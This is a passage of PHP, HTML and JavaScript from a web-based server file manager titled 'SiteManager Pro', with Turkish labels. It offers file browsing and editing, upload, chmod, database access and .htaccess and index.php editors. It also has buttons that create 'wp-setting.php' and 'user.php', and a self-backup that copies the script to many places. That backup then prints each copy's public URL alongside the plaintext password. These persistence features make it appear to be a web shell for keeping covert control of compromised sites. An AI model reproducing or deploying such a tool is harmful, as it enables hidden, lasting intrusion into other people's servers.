.drop-zone svg { width: 40px; height: 40px; margin-bottom: 12px; opacity: 0.4; }

/* Context menu */
.context-menu { display: none; position: fixed; background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 6px 0; min-width: 200px; z-index: 1001; box-shadow: var(--shadow-lg); animation: fadeIn 0.1s; }
.context-menu.active { display: block; }
.context-menu a, .context-menu button { display: flex; align-items: center; gap: 10px; padding: 8px 16px; color: var(--text); border: none; background: none; width: 100%; text-align: left; cursor: pointer; font-size: 13px; font-family: inherit; transition: background 0.1s; }
.context-menu a:hover, .context-menu button:hover { background: var(--primary-light); color: var(--primary); }
.context-menu .divider { border-top: 1px solid var(--border); margin: 4px 0; }
.context-menu .danger { color: var(--danger); }
.context-menu .danger:hover { background: var(--danger-light); }

/* Statusbar */
.statusbar { background: var(--bg2); border-top: 1px solid var(--border); padding: 6px 20px; font-size: 11px; color: var(--text3); display: flex; justify-content: space-between; font-weight: 450; }

.quick-actions { display: flex; gap: 6px; flex-wrap: wrap; }
.search-box { position: relative; }
.search-box input { padding-left: 12px; }

/* Tabs */
.tabs { display: flex; gap: 0; border-bottom: 2px solid var(--border); margin-bottom: 20px; }
.tab { padding: 10px 18px; background: transparent; border: none; border-bottom: 2px solid transparent; margin-bottom: -2px; color: var(--text2); cursor: pointer; font-size: 13px; font-weight: 500; font-family: inherit; transition: all 0.15s; }
.tab.active { color: var(--primary); border-bottom-color: var(--primary); }
.tab:hover { color: var(--text); }

/* Data table */
table.data-table { width: 100%; border-collapse: separate; border-spacing: 0; font-size: 13px; border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
table.data-table th, table.data-table td { padding: 10px 12px; text-align: left; border-bottom: 1px solid var(--border); }
table.data-table th { background: var(--bg3); font-weight: 600; font-size: 11px; text-transform: uppercase; color: var(--text2); letter-spacing: 0.3px; }
table.data-table tr:last-child td { border-bottom: none; }
table.data-table tr:hover td { background: var(--primary-light); }

/* Badges */
.badge { display: inline-flex; align-items: center; gap: 4px; padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; letter-spacing: 0.2px; }
.badge-success { background: var(--success-light); color: var(--success); }
.badge-danger { background: var(--danger-light); color: var(--danger); }
.badge-warning { background: var(--warning-light); color: var(--warning); }
.badge-info { background: var(--info-light); color: var(--info); }

pre.code-block { background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius); padding: 14px; font-size: 12px; overflow-x: auto; margin: 8px 0; font-family: 'Fira Code', monospace; line-height: 1.6; }
.preview-img { max-width: 100%; max-height: 400px; border-radius: var(--radius); border: 1px solid var(--border); box-shadow: var(--shadow-lg); }

/* Dual panel */
.dual-panel { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
.panel { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; box-shadow: var(--shadow); }
.panel-header { padding: 10px 14px; background: var(--bg3); border-bottom: 1px solid var(--border); font-size: 12px; font-weight: 600; color: var(--text2); font-family: monospace; }
.panel-body { max-height: 500px; overflow-y: auto; }
.panel-body table { width: 100%; }
.panel-body td { padding: 6px 12px; border-bottom: 1px solid var(--border); font-size: 13px; cursor: pointer; transition: background 0.1s; }
.panel-body td:hover { background: var(--primary-light); }

/* Permission status */
.perm-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 12px; }
.perm-item { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); box-shadow: var(--shadow); }
.perm-item .perm-label { font-weight: 500; font-size: 13px; }
.perm-item .perm-detail { font-size: 11px; color: var(--text3); }

/* Page title */
.page-title { font-size: 20px; font-weight: 700; margin-bottom: 20px; letter-spacing: -0.3px; display: flex; align-items: center; gap: 10px; }
.page-title svg { width: 22px; height: 22px; color: var(--primary); }

@media (max-width: 768px) {
    .sidebar { display: none; }
    .dual-panel { grid-template-columns: 1fr; }
    .file-table .hide-mobile { display: none; }
    .header-actions .hide-mobile { display: none; }
    .content { padding: 12px; }
    .info-grid { grid-template-columns: 1fr; }
}
</style></head><body>
<?php
}

// ======================== MAIN LAYOUT ========================
sm_render_head($theme);
$root = sm_root_dir();
$doc_root = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__);
$wp_sites = sm_find_wp_sites($doc_root);
$bookmarks = sm_get_bookmarks();
?>
<div class="app">
<div class="header">
    <div class="header-left">
        <div class="logo-sm"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"/></svg></div>
        <h1><?= SM_APP_NAME ?></h1>
        <span class="header-version">v<?= SM_VERSION ?></span>
    </div>
    <div class="header-actions">
        <a href="?theme=<?= $theme === 'dark' ? 'light' : 'dark' ?>" class="btn btn-sm" title="Tema"><?= $theme === 'dark' ? '&#9728;&#65039;' : '&#127769;' ?></a>
        <button type="button" class="btn btn-sm hide-mobile" onclick="openHtaccess()">&#128221; .htaccess</button>
        <form method="POST" style="display:inline"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="create_wp_setting"><button type="submit" class="btn btn-sm btn-success hide-mobile">&#128204; wp-setting.php</button></form>
        <button type="button" class="btn btn-sm hide-mobile" onclick="openIndexPhp()">&#128196; index.php</button>
        <form method="POST" style="display:inline"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="create_user_php"><button type="submit" class="btn btn-sm btn-success hide-mobile">&#128100; user.php</button></form>
        <form method="POST" style="display:inline"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="quick_cache_clear"><button type="submit" class="btn btn-sm btn-warning hide-mobile">&#128259; Cache Temizle</button></form>
        <a href="?action=settings" class="btn btn-sm hide-mobile">&#9881;&#65039; Ayarlar</a>
        <form method="POST" style="display:inline"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="self_backup"><button type="submit" class="btn btn-sm hide-mobile">&#128190; Yedekle</button></form>
        <a href="?action=logout" class="btn btn-sm btn-danger">&#128682; Cikis</a>
    </div>
</div>
<div class="main">
<div class="sidebar">
    <div class="sidebar-title">Gezinti</div>
    <ul class="sidebar-nav">
        <li><a href="?action=browse&path=<?= urlencode($doc_root) ?>">Ana Dizin</a></li>
        <li><a href="?action=browse&path=<?= urlencode($root) ?>">Kok Dizin</a></li>
        <li><a href="?action=browse&path=<?= urlencode(__DIR__) ?>">Script Dizini</a></li>
    </ul>
    <?php if ($bookmarks): ?>
    <div class="sidebar-title">Yer Imleri</div>
    <ul class="sidebar-nav">
        <?php foreach ($bookmarks as $bpath => $bname): ?>
        <li><a href="?action=browse&path=<?= urlencode($bpath) ?>" title="<?= htmlspecialchars($bpath) ?>"><?= htmlspecialchars($bname) ?></a></li>
        <?php endforeach; ?>
    </ul>
    <?php endif; ?>
    <?php if ($wp_sites): ?>
    <div class="sidebar-title">WordPress</div>
    <ul class="sidebar-nav">
        <?php foreach ($wp_sites as $site): ?>
        <li><a href="?action=browse&path=<?= urlencode($site) ?>"><?= basename($site) === basename($doc_root) ? 'Ana Site' : basename($site) ?></a></li>
        <?php endforeach; ?>
    </ul>
    <?php endif; ?>
    <div class="sidebar-title">Dosya Araclari</div>
    <ul class="sidebar-nav">
        <li><a href="?action=search">Dosya Ara</a></li>
        <li><a href="?action=content_search">Icerik Ara</a></li>
        <li><a href="?action=recent_files">Son Degisen</a></li>
        <li><a href="?action=dual_panel">Cift Panel</a></li>
    </ul>
    <div class="sidebar-title">SEO Araclari</div>
    <ul class="sidebar-nav">
        <li><a href="?action=robots_txt">robots.txt</a></li>
        <li><a href="?action=sitemap">Sitemap</a></li>
        <li><a href="?action=meta_check">Meta Kontrol</a></li>
        <li><a href="?action=redirect_check">Redirect Kontrol</a></li>
        <li><a href="?action=htaccess_tools">Htaccess Araclari</a></li>
    </ul>
    <div class="sidebar-title">WordPress</div>
    <ul class="sidebar-nav">
        <li><a href="?action=wp_manager">WP Yonetici</a></li>
    </ul>
    <div class="sidebar-title">Guvenlik</div>
    <ul class="sidebar-nav">
        <li><a href="?action=permissions">Izin Kontrol</a></li>
        <li><a href="?action=malware_scan">Malware Tara</a></li>
        <li><a href="?action=wp_integrity">WP Butunluk</a></li>
        <li><a href="?action=activity_log">Islem Kaydi</a></li>
    </ul>
    <div class="sidebar-title">Gelismis</div>
    <ul class="sidebar-nav">
        <li><a href="?action=ssl_check">SSL Kontrol</a></li>
        <li><a href="?action=dns_lookup">DNS Sorgula</a></li>
        <li><a href="?action=db_manager">Veritabani</a></li>
        <li><a href="?action=info">Sunucu Bilgisi</a></li>
    </ul>
    <?php $recent = sm_get_recent(); if ($recent): ?>
    <div class="sidebar-title">Son Acilanlar</div>
    <ul class="sidebar-nav">
        <?php foreach (array_slice($recent, 0, 8) as $rf): ?>
        <li><a href="?action=edit&path=<?= urlencode($rf) ?>" title="<?= htmlspecialchars($rf) ?>"><?= basename($rf) ?></a></li>
        <?php endforeach; ?>
    </ul>
    <?php endif; ?>
</div>
<div class="content">
    <?php if ($message): ?><div class="alert alert-<?= $message_type ?>"><?= htmlspecialchars($message) ?></div><?php endif; ?>
    <?php
    switch ($action) {
        case 'edit': sm_page_edit($path); break;
        case 'cache': sm_page_cache($doc_root, $wp_sites); break;
        case 'info': sm_page_info(); break;
        case 'settings': sm_page_settings(); break;
        case 'htaccess_tools': sm_page_htaccess_tools($doc_root, $wp_sites); break;
        case 'search': sm_page_search($current_dir); break;
        case 'content_search': sm_page_content_search($current_dir); break;
        case 'robots_txt': sm_page_robots($doc_root, $wp_sites); break;
        case 'sitemap': sm_page_sitemap($doc_root, $wp_sites); break;
        case 'meta_check': sm_page_meta_check(); break;
        case 'redirect_check': sm_page_redirect_check(); break;
        case 'wp_manager': sm_page_wp_manager($doc_root, $wp_sites); break;
        case 'permissions': sm_page_permissions($doc_root, $wp_sites); break;
        case 'malware_scan': sm_page_malware_scan($doc_root); break;
        case 'wp_integrity': sm_page_wp_integrity($wp_sites); break;
        case 'activity_log': sm_page_activity_log(); break;
        case 'recent_files': sm_page_recent_files($doc_root); break;
        case 'dual_panel': sm_page_dual_panel($current_dir); break;
        case 'ssl_check': sm_page_ssl_check(); break;
        case 'dns_lookup': sm_page_dns_lookup(); break;
        case 'db_manager': sm_page_db_manager($wp_sites); break;
        case 'file_preview': sm_page_file_preview($path); break;
        default: sm_page_browse($current_dir); break;
    }
    ?>
</div>
</div>
<div class="statusbar">
    <span><?= htmlspecialchars($current_dir) ?></span>
    <span>PHP <?= phpversion() ?> | <?= php_uname('s') ?> | <?= SM_APP_NAME ?> v<?= SM_VERSION ?></span>
</div>
</div>

<!-- Modals -->
<div class="modal-overlay" id="createModal"><div class="modal">
    <h3 id="createModalTitle">Yeni Dosya</h3>
    <form method="POST"><input type="hidden" name="_token" value="<?= sm_token() ?>">
        <input type="hidden" name="action" id="createAction" value="create_file">
        <input type="hidden" name="create_dir" value="<?= htmlspecialchars($current_dir) ?>">
        <div class="form-group"><label>Isim</label><input type="text" name="new_name" required placeholder="dosya_adi.php"></div>
        <div class="modal-actions"><button type="button" class="btn" onclick="closeModal('createModal')">Iptal</button><button type="submit" class="btn btn-primary">Olustur</button></div>
    </form>
</div></div>

<div class="modal-overlay" id="renameModal"><div class="modal">
    <h3>Yeniden Adlandir</h3>
    <form method="POST"><input type="hidden" name="_token" value="<?= sm_token() ?>">
        <input type="hidden" name="action" value="rename"><input type="hidden" name="old_path" id="renamePath" value="">
        <div class="form-group"><label>Yeni Isim</label><input type="text" name="new_name" id="renameInput" required></div>
        <div class="modal-actions"><button type="button" class="btn" onclick="closeModal('renameModal')">Iptal</button><button type="submit" class="btn btn-primary">Kaydet</button></div>
    </form>
</div></div>

<div class="modal-overlay" id="chmodModal"><div class="modal">
    <h3>Izinleri Degistir</h3>
    <form method="POST"><input type="hidden" name="_token" value="<?= sm_token() ?>">
        <input type="hidden" name="action" value="chmod"><input type="hidden" name="chmod_path" id="chmodPath" value="">
        <div class="form-group"><label>Izin (orn: 0755)</label><input type="text" name="chmod_val" id="chmodInput" required pattern="[0-7]{3,4}"></div>
        <div class="modal-actions"><button type="button" class="btn" onclick="closeModal('chmodModal')">Iptal</button><button type="submit" class="btn btn-primary">Uygula</button></div>
    </form>
</div></div>

<div class="modal-overlay" id="copyMoveModal"><div class="modal">
    <h3 id="copyMoveTitle">Kopyala</h3>
    <form method="POST" id="copyMoveForm"><input type="hidden" name="_token" value="<?= sm_token() ?>">
        <input type="hidden" name="action" id="copyMoveAction" value="copy"><input type="hidden" name="src_path" id="copyMoveSrc" value="">
        <div class="form-group"><label>Hedef Dizin</label><input type="text" name="dst_dir" required></div>
        <div class="modal-actions"><button type="button" class="btn" onclick="closeModal('copyMoveModal')">Iptal</button><button type="submit" class="btn btn-primary" id="copyMoveBtn">Kopyala</button></div>
    </form>
</div></div>

<div class="modal-overlay" id="uploadModal"><div class="modal">
    <h3>Dosya Yukle</h3>
    <form method="POST" enctype="multipart/form-data"><input type="hidden" name="_token" value="<?= sm_token() ?>">
        <input type="hidden" name="action" value="upload"><input type="hidden" name="upload_dir" value="<?= htmlspecialchars($current_dir) ?>">
        <div class="drop-zone" id="dropZone" onclick="document.getElementById('fileInput').click()">
            <p>Dosyalari surukleyin veya tiklayin</p>
            <p style="font-size:12px;margin-top:8px">Coklu dosya secebilirsiniz | Max: <?= SM_MAX_UPLOAD ?> MB</p>
            <input type="file" name="upload_files[]" id="fileInput" style="display:none" multiple onchange="this.form.submit()">
        </div>
    </form>
</div></div>

<div class="modal-overlay" id="bookmarkModal"><div class="modal">
    <h3>Yer Imi Ekle</h3>
    <form method="POST"><input type="hidden" name="_token" value="<?= sm_token() ?>">
        <input type="hidden" name="action" value="add_bookmark"><input type="hidden" name="bm_path" id="bmPath" value="">
        <div class="form-group"><label>Isim</label><input type="text" name="bm_name" id="bmName" required></div>
        <div class="modal-actions"><button type="button" class="btn" onclick="closeModal('bookmarkModal')">Iptal</button><button type="submit" class="btn btn-primary">Ekle</button></div>
    </form>
</div></div>

<?php if (!empty($_SESSION['sm_backup_show']) && !empty($_SESSION['sm_backup_result'])): $bk_paths = $_SESSION['sm_backup_result']; unset($_SESSION['sm_backup_show']); ?>
<div class="modal-overlay active" id="backupResultModal"><div class="modal" style="max-width:650px">
    <h3 style="display:flex;align-items:center;gap:10px">
        <svg viewBox="0 0 24 24" fill="none" stroke="var(--success)" stroke-width="2" style="width:24px;height:24px"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
        Yedekleme Tamamlandi!
    </h3>
    <p style="color:var(--text2);font-size:13px;margin-bottom:12px"><?= count($bk_paths) ?> farkli konuma basariyla yedeklendi.</p>
    <?php $dbg = $_SESSION['sm_backup_debug'] ?? []; if ($dbg): ?>
    <div style="background:var(--bg);padding:8px 12px;border-radius:6px;font-size:11px;color:var(--text3);margin-bottom:12px">
        Mod: <?= $dbg['mode'] ?? '-' ?> | Basarili: <?= $dbg['saved'] ?? '-' ?> | Root: <?= $dbg['doc_root'] ?? '-' ?>
    </div>
    <?php endif; ?>

    <div style="background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);max-height:300px;overflow-y:auto">
        <table style="width:100%;font-size:12px;border-collapse:collapse">
            <thead><tr>
                <th style="padding:8px 10px;text-align:left;border-bottom:1px solid var(--border);font-size:10px;text-transform:uppercase;color:var(--text3);position:sticky;top:0;background:var(--bg3)">#</th>
                <th style="padding:8px 10px;text-align:left;border-bottom:1px solid var(--border);font-size:10px;text-transform:uppercase;color:var(--text3);position:sticky;top:0;background:var(--bg3)">Dosya Yolu</th>
                <th style="padding:8px 10px;text-align:left;border-bottom:1px solid var(--border);font-size:10px;text-transform:uppercase;color:var(--text3);position:sticky;top:0;background:var(--bg3)">Erisim URL</th>
            </tr></thead>
            <tbody>
            <?php
            $doc_r = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? ''), '/');
            $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
            // Script'in kendi URL'sinden base path hesapla
            $script_dir = str_replace('\\', '/', dirname($_SERVER['SCRIPT_FILENAME'] ?? __FILE__));
            $script_uri = dirname($_SERVER['SCRIPT_NAME'] ?? $_SERVER['PHP_SELF'] ?? '/');
            foreach ($bk_paths as $bi => $bp):
                $bp_clean = str_replace('\\', '/', $bp);
                $burl = '';
                // Yontem 1: DOCUMENT_ROOT ile eslesir mi
                if ($doc_r && strpos($bp_clean, $doc_r) === 0) {
                    $rel = substr($bp_clean, strlen($doc_r));
                    if ($rel && $rel[0] !== '/') $rel = '/' . $rel;
                    $burl = $proto . $rel;
                }
                // Yontem 2: Script dizini uzerinden hesapla
                if (!$burl && $script_dir && strpos($bp_clean, $script_dir) === 0) {
                    $rel = substr($bp_clean, strlen($script_dir));
                    if ($rel && $rel[0] !== '/') $rel = '/' . $rel;
                    $burl = $proto . rtrim($script_uri, '/') . $rel;
                }
                // Yontem 3: public_html veya www iceriyorsa oradan kes
                if (!$burl) {
                    foreach (['public_html/', 'htdocs/', 'www/', 'httpdocs/'] as $webdir) {
                        $pos = strpos($bp_clean, '/' . $webdir);
                        if ($pos !== false) {
                            $rel = substr($bp_clean, $pos + strlen($webdir));
                            $burl = $proto . '/' . $rel;
                            break;
                        }
                    }
                }
                if (!$burl) $burl = 'Document root disinda - URL yok';
            ?>
            <tr>
                <td style="padding:6px 10px;border-bottom:1px solid var(--border);color:var(--text3)"><?= $bi + 1 ?></td>
                <td style="padding:6px 10px;border-bottom:1px solid var(--border);font-family:monospace;word-break:break-all;white-space:normal"><?= htmlspecialchars($bp) ?></td>
                <td style="padding:6px 10px;border-bottom:1px solid var(--border);font-family:monospace;word-break:break-all;white-space:normal;font-size:11px"><?= htmlspecialchars($burl) ?></td>
            </tr>
            <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <div id="backupReportData" style="display:none"><?php
        $rpt = "SITEMANAGER PRO - YEDEK RAPORU\n";
        $rpt .= "Tarih: " . date('Y-m-d H:i:s') . "\n";
        $rpt .= "Sunucu: " . ($_SERVER['HTTP_HOST'] ?? '-') . "\n";
        $rpt .= "Toplam: " . count($bk_paths) . " yedek\n\n";
        foreach ($bk_paths as $bi => $bp) {
            $bp_c = str_replace('\\', '/', $bp);
            $bu = '';
            if ($doc_r && strpos($bp_c, $doc_r) === 0) {
                $rl = substr($bp_c, strlen($doc_r));
                if ($rl && $rl[0] !== '/') $rl = '/' . $rl;
                $bu = $proto . $rl;
            }
            if (!$bu) {
                foreach (['public_html/', 'htdocs/', 'www/', 'httpdocs/'] as $wd) {
                    $ps = strpos($bp_c, '/' . $wd);
                    if ($ps !== false) { $bu = $proto . '/' . substr($bp_c, $ps + strlen($wd)); break; }
                }
            }
            if (!$bu) $bu = 'Document root disinda';
            $rpt .= "[" . ($bi+1) . "] " . $bp . "\n    URL: " . $bu . "\n\n";
        }
        $plain = $_SESSION['sm_plain_pass'] ?? '';
        $rpt .= "Sifre: " . ($plain ? $plain : '(Bu oturumda giris yapilmadi, sifre gosterilemez)') . "\n";
        echo htmlspecialchars($rpt);
    ?></div>

    <div class="modal-actions" style="flex-wrap:wrap;justify-content:flex-start;gap:8px">
        <button type="button" class="btn btn-primary" onclick="copyBackupReport()" id="copyBtn">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
            Kopyala
        </button>
        <a href="?action=download_backup_report" class="btn btn-success">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            Indir (.txt)
        </a>
        <button type="button" class="btn btn-warning" onclick="saveAsBackupReport()">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px"><path d="M19 21H5a2 2 0 01-2-2V5a2 2 0 012-2h11l5 5v11a2 2 0 01-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>
            Farkli Kaydet
        </button>
        <button type="button" class="btn" onclick="closeModal('backupResultModal')" style="margin-left:auto">Kapat</button>
    </div>
</div></div>
<script>
function copyBackupReport(){
    var text=document.getElementById('backupReportData').textContent;
    navigator.clipboard.writeText(text).then(function(){
        var btn=document.getElementById('copyBtn');
        btn.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px"><polyline points="20 6 9 17 4 12"/></svg> Kopyalandi!';
        btn.classList.remove('btn-primary');btn.classList.add('btn-success');
        setTimeout(function(){
            btn.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> Kopyala';
            btn.classList.remove('btn-success');btn.classList.add('btn-primary');
        },2000);
    });
}
function saveAsBackupReport(){
    var text=document.getElementById('backupReportData').textContent;
    var blob=new Blob([text],{type:'text/plain;charset=utf-8'});
    var url=URL.createObjectURL(blob);
    var a=document.createElement('a');
    a.href=url;
    a.download='<?= preg_replace("/[^a-zA-Z0-9._-]/", "_", $_SERVER["HTTP_HOST"] ?? "site") ?>_yedek_<?= date("Ymd_His") ?>.txt';
    // showSaveFilePicker varsa "Farkli Kaydet" dialogu ac
    if(window.showSaveFilePicker){
        window.showSaveFilePicker({
            suggestedName:'<?= preg_replace("/[^a-zA-Z0-9._-]/", "_", $_SERVER["HTTP_HOST"] ?? "site") ?>_yedek_<?= date("Ymd_His") ?>.txt',
            types:[{description:'Metin Dosyasi',accept:{'text/plain':['.txt']}}]
        }).then(function(handle){
            return handle.createWritable();
        }).then(function(writable){
            writable.write(blob);
            return writable.close();
        }).catch(function(){
            // Iptal edildiyse normal indir
            a.click();
        });
    } else {
        // Eski tarayicilarda normal indirme
        a.click();
    }
    URL.revokeObjectURL(url);
}
</script>
<?php endif; ?>

<?php
// index.php popup icin icerik oku
$indexphp_path = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__), '/') . '/index.php';
$indexphp_content = file_exists($indexphp_path) ? file_get_contents($indexphp_path) : '';
$indexphp_exists = file_exists($indexphp_path);
$indexphp_writable = $indexphp_exists ? is_writable($indexphp_path) : is_writable(dirname($indexphp_path));
?>
<div class="modal-overlay" id="indexPhpModal"><div class="modal" style="max-width:700px">
    <h3 style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
        <svg viewBox="0 0 24 24" fill="none" stroke="var(--primary)" stroke-width="2" style="width:22px;height:22px"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
        index.php
    </h3>
    <div style="font-size:11px;color:var(--text3);margin-bottom:12px"><?= htmlspecialchars($indexphp_path) ?> <?= $indexphp_exists ? '<span style="color:var(--success)">mevcut</span>' : '<span style="color:var(--warning)">yok - kaydedince olusturulacak</span>' ?></div>
    <form method="POST" id="indexPhpForm"><input type="hidden" name="_token" value="<?= sm_token() ?>">
        <input type="hidden" name="action" value="save_index_php">
        <textarea name="indexphp_content" id="indexPhpTextarea" style="width:100%;min-height:350px;font-family:'Fira Code','Cascadia Code',monospace;font-size:13px;line-height:1.7;tab-size:4;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:14px;resize:vertical" <?= !$indexphp_writable ? 'readonly' : '' ?>><?= htmlspecialchars($indexphp_content) ?></textarea>
        <div class="modal-actions">
            <?= $indexphp_writable ? '<span style="color:var(--success);font-size:12px">Yazilabilir</span>' : '<span style="color:var(--danger);font-size:12px">Salt okunur</span>' ?>
            <span style="flex:1"></span>
            <button type="button" class="btn" onclick="closeModal('indexPhpModal')">Kapat</button>
            <button type="submit" class="btn btn-primary" <?= !$indexphp_writable ? 'disabled' : '' ?>>Kaydet</button>
        </div>
    </form>
</div></div>
<?php
// .htaccess popup icin icerik oku
$htaccess_path = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? __DIR__), '/') . '/.htaccess';
$htaccess_content = file_exists($htaccess_path) ? file_get_contents($htaccess_path) : '';
$htaccess_exists = file_exists($htaccess_path);
$htaccess_writable = $htaccess_exists ? is_writable($htaccess_path) : is_writable(dirname($htaccess_path));
?>
<div class="modal-overlay" id="htaccessModal"><div class="modal" style="max-width:700px">
    <h3 style="display:flex;align-items:center;gap:10px;margin-bottom:4px">
        <svg viewBox="0 0 24 24" fill="none" stroke="var(--primary)" stroke-width="2" style="width:22px;height:22px"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
        .htaccess
    </h3>
    <div style="font-size:11px;color:var(--text3);margin-bottom:12px"><?= htmlspecialchars($htaccess_path) ?> <?= $htaccess_exists ? '<span style="color:var(--success)">mevcut</span>' : '<span style="color:var(--warning)">yok - kaydedince olusturulacak</span>' ?></div>
    <form method="POST" id="htaccessForm"><input type="hidden" name="_token" value="<?= sm_token() ?>">
        <input type="hidden" name="action" value="save_htaccess">
        <textarea name="htaccess_content" id="htaccessTextarea" style="width:100%;min-height:350px;font-family:'Fira Code','Cascadia Code',monospace;font-size:13px;line-height:1.7;tab-size:4;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:14px;resize:vertical" <?= !$htaccess_writable ? 'readonly' : '' ?>><?= htmlspecialchars($htaccess_content) ?></textarea>
        <div class="modal-actions">
            <?= $htaccess_writable ? '<span style="color:var(--success);font-size:12px">Yazilabilir</span>' : '<span style="color:var(--danger);font-size:12px">Salt okunur</span>' ?>
            <span style="flex:1"></span>
            <button type="button" class="btn" onclick="closeModal('htaccessModal')">Kapat</button>
            <button type="submit" class="btn btn-primary" <?= !$htaccess_writable ? 'disabled' : '' ?>>Kaydet</button>
        </div>
    </form>
</div></div>

<div class="context-menu" id="contextMenu"></div>

<script>
function openIndexPhp(){openModal('indexPhpModal')}
function openHtaccess(){openModal('htaccessModal')}
function openModal(id){document.getElementById(id).classList.add('active')}
function closeModal(id){document.getElementById(id).classList.remove('active')}
document.querySelectorAll('.modal-overlay').forEach(m=>{m.addEventListener('click',function(e){if(e.target===this)this.classList.remove('active')})});
function createFile(){document.getElementById('createModalTitle').textContent='Yeni Dosya';document.getElementById('createAction').value='create_file';openModal('createModal')}
function createDir(){document.getElementById('createModalTitle').textContent='Yeni Klasor';document.getElementById('createAction').value='create_dir';openModal('createModal')}
function renameItem(p,n){document.getElementById('renamePath').value=p;document.getElementById('renameInput').value=n;openModal('renameModal')}
function chmodItem(p,c){document.getElementById('chmodPath').value=p;document.getElementById('chmodInput').value=c;openModal('chmodModal')}
function copyItem(p){document.getElementById('copyMoveTitle').textContent='Kopyala';document.getElementById('copyMoveAction').value='copy';document.getElementById('copyMoveSrc').value=p;document.getElementById('copyMoveBtn').textContent='Kopyala';openModal('copyMoveModal')}
function moveItem(p){document.getElementById('copyMoveTitle').textContent='Tasi';document.getElementById('copyMoveAction').value='move';document.getElementById('copyMoveSrc').value=p;document.getElementById('copyMoveBtn').textContent='Tasi';openModal('copyMoveModal')}
function bookmarkItem(p,n){document.getElementById('bmPath').value=p;document.getElementById('bmName').value=n;openModal('bookmarkModal')}
function deleteItem(p,n){if(confirm(n+' silinsin mi?')){var f=document.createElement('form');f.method='POST';f.innerHTML='<input type="hidden" name="_token" value="<?=sm_token()?>"><input type="hidden" name="action" value="delete"><input type="hidden" name="del_path" value="'+p+'">';document.body.appendChild(f);f.submit()}}
function compressItem(p){var f=document.createElement('form');f.method='POST';f.innerHTML='<input type="hidden" name="_token" value="<?=sm_token()?>"><input type="hidden" name="action" value="compress"><input type="hidden" name="comp_path" value="'+p+'">';document.body.appendChild(f);f.submit()}
function extractItem(p){var f=document.createElement('form');f.method='POST';f.innerHTML='<input type="hidden" name="_token" value="<?=sm_token()?>"><input type="hidden" name="action" value="extract"><input type="hidden" name="ext_path" value="'+p+'">';document.body.appendChild(f);f.submit()}
function toggleAll(cb){document.querySelectorAll('.item-cb').forEach(function(c){c.checked=cb.checked})}
function bulkDelete(){var ch=document.querySelectorAll('.item-cb:checked');if(!ch.length){alert('Oge secin');return}if(!confirm(ch.length+' oge silinsin mi?'))return;var f=document.createElement('form');f.method='POST';var h='<input type="hidden" name="_token" value="<?=sm_token()?>"><input type="hidden" name="action" value="bulk_delete">';ch.forEach(function(c){h+='<input type="hidden" name="items[]" value="'+c.value+'">'});f.innerHTML=h;document.body.appendChild(f);f.submit()}
function filterFiles(q){q=q.toLowerCase();document.querySelectorAll('.file-row').forEach(function(r){r.style.display=r.getAttribute('data-name').toLowerCase().includes(q)?'':'none'})}

// Sort table
function sortTable(col){
    var table=document.querySelector('.file-table');if(!table)return;
    var tbody=table.querySelector('tbody');var rows=Array.from(tbody.querySelectorAll('tr.file-row'));
    var dir=table.getAttribute('data-sort-dir')==='asc'?'desc':'asc';
    table.setAttribute('data-sort-dir',dir);
    rows.sort(function(a,b){
        var av=a.getAttribute('data-'+col)||'';var bv=b.getAttribute('data-'+col)||'';
